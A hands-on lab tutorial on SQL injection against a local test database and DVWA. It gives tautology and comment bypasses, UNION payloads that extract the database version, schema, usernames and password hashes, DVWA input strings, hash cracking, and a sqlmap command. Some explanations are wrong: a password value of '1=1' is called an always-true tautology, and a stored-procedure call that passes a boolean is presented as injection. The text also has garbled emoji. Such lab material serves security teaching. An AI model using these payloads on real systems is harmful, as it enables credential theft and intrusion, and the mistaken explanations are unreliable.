# üö© **Practical: SQL Injection ‚Äî phpMyAdmin, DVWA, Burp Suite, SQLMAP**

## üóÇÔ∏è **Part 1: Setup ‚Äî Create a Test Database**

---

### ‚úÖ **1Ô∏è‚É£ Open phpMyAdmin**

- On your **Windows VM**, open browser:

  ```
  localhost:8080/phpmyadmin/
  ```

- **Login** with your DB root user if needed.

---

### ‚úÖ **2Ô∏è‚É£ Create Database & Table**

- **Create Database:**
  Name: `ditiss`

- **Create Table:**
  Name: `students`
  Columns: **5**

| Column Name  | Type    | Length | NULL |
| ------------ | ------- | ------ | ---- |
| student_name | varchar | 50     | ‚úîÔ∏è   |
| username     | varchar | 50     | ‚úîÔ∏è   |
| password     | varchar | 50     | ‚úîÔ∏è   |
| email        | varchar | 50     | ‚úîÔ∏è   |
| mobile       | varchar | 10     | ‚úîÔ∏è   |

‚úÖ Click **Save**.

---

### ‚úÖ **3Ô∏è‚É£ Insert Test Data**

Add **5 dummy records**, e.g.:

```
student_name | username | password  | email               | mobile
---------------------------------------------------------------------------
Tom          | tom      | P@ssword  | tom@example.com     | 9876543210
Jerry        | jerry    | test123   | jerry@example.com   | 9876543211
Mickey       | mickey   | abc@123   | mickey@example.com  | 9876543212
Donald       | donald   | quack321  | donald@example.com  | 9876543213
Goofy        | goofy    | goofy456  | goofy@example.com   | 9876543214
```

---

## üóÇÔ∏è **Part 2: Test SELECT Queries & Injection**

---

‚úÖ Open **SQL tab** in phpMyAdmin or use your vulnerable web form (if any).

---

### ‚úÖ **Basic Valid Login**

```sql
SELECT * FROM students WHERE username="tom" AND password="P@ssword";
```

‚úîÔ∏è **Output:** 1 record

---

### ‚úÖ **Basic SQL Injection**

**Bypass with tautology:**

```sql
SELECT * FROM students WHERE username="tom" AND password="1=1";
```

‚úÖ Always returns **true** ‚Üí returns Tom‚Äôs row if query is poorly validated.

---

### ‚úÖ **Use Comments (#)**

**Bypass whole WHERE clause:**

```sql
SELECT * FROM students WHERE username='tom' AND '1'='1'# password=' ';
```

‚úîÔ∏è `#` comments out the rest.

---

**Show all rows:**

```sql
SELECT * FROM students WHERE username='user1' OR '1'='1'# password=' ';
```

‚úÖ Returns **all students** if vulnerable.

---

---

## üóÇÔ∏è **Part 3: SQL UNION ‚Äî Join Extra Data**

---

‚úÖ **Basic UNION**

```sql
SELECT student_name, email, mobile FROM students WHERE username='tom'
UNION SELECT 1,2,3;
```

‚úÖ **Output:** Combines real row + dummy `1,2,3`.

---

**Leak DB Version:**

```sql
SELECT student_name, email, mobile FROM students WHERE username='tom'
UNION SELECT 1, version(), 3;
```

‚úîÔ∏è Returns `10.4.32-MariaDB` (example).

---

**List Tables:**

```sql
SELECT student_name, email, mobile FROM students WHERE username='tom'
UNION SELECT 1, TABLE_NAME, 3 FROM information_schema.tables;
```

---

**List Columns:**

```sql
SELECT student_name, email, mobile FROM students WHERE username='tom'
UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE TABLE_NAME='students';
```

---

**Extract Usernames & Passwords:**

```sql
SELECT student_name, email, mobile FROM students WHERE username='tom'
UNION SELECT username, password, NULL FROM students;
```

---

**Find DB Name:**

```sql
SELECT student_name, email, mobile FROM students WHERE username='tom'
UNION SELECT NULL, SCHEMA_NAME, NULL FROM information_schema.schemata;
```

---

## üóÇÔ∏è **Part 4: Try on Real DVWA**

---

‚úÖ **URL:** `http://localhost:8080/dvwa`

Login ‚Üí Go to **SQL Injection** module.

---

### ‚úÖ **Test Inputs:**

```
User ID: '
User ID: 1' OR '1'='1'#
User ID: 1' UNION SELECT 1,2#
User ID: 1' UNION SELECT 1,version()#
User ID: a' UNION SELECT 1,database()#
User ID: a' UNION SELECT 1,user()#
```

‚úîÔ∏è See output:

- DB version
- DB name (`dvwa`)
- Current DB user (`dvwa@localhost`)

---

**Find Columns:**

```
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
```

‚úîÔ∏è Returns user table columns.

---

**Dump Hashes:**

```
1' UNION SELECT user, password FROM users #
```

Use **crackstation.net** to crack common MD5 hashes (`5f4dcc3b5aa765d61d8327deb882cf99` ‚Üí `password`).

---

## üóÇÔ∏è **Part 5: Use Burp Suite & sqlmap**

---

‚úÖ Intercept vulnerable request in **Burp**.

Example:

```bash
sqlmap --url="http://192.168.80.154:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -H "Cookie: PHPSESSID=....; security=low" -p id --dbs
```

‚úîÔ∏è `--dbs` ‚Üí enumerate databases.

---

## üóÇÔ∏è **Part 6: Stored Procedure Injection**

---

‚úÖ Example Stored Procedure:

```sql
DELIMITER //
CREATE PROCEDURE usr_Login4(name VARCHAR(50), Pass VARCHAR(50))
BEGIN
  SELECT * FROM students WHERE username = name AND password = Pass;
END //
DELIMITER ;
```

**Run legit:**

```sql
CALL usr_Login4('sam', 'P@ssword');
```

**Inject:**

```sql
CALL usr_Login4('sam' OR '1'='1', 'P@ssword');
```

‚úÖ If input is not sanitized, this returns all rows.

---

## ‚úÖ **Best References**

- üìö [Imperva SQLi Guide](https://www.imperva.com/learn/application-security/sql-injection-sqli/)
- üìö [DVWA SQLi Walkthrough](https://medium.com/@waeloueslati18/exploring-dvwa-a-walkthrough-of-the-sql-injection-challenge-part-7-7ada1ae784f2)
- üìö [CSPANIAS DVWA Post](https://cspanias.github.io/posts/DVWA-SQL-Injection/)

---
